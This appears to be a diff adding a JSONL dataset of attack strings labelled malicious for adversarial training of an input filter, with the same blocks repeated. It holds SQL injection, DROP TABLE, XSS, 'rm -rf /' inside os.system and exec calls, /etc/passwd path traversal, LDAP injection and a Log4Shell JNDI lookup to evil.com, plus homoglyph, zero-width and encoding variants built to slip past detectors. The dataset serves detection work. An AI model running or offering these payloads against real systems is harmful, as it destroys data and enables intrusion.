@@ -1,0 +1,813 @@
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "DROP TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "DROP TаBLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "DROP TABLе users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "DROP\\x20TABLE\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "rm -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "rm\\x20-rf\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "rM -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "import os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "import os; os.systеm('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "impоrt os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.309809"}
+{"text": "import\\x20os;\\x20os.system('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "exec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "еxec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "exeс('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "exec('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.310319"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
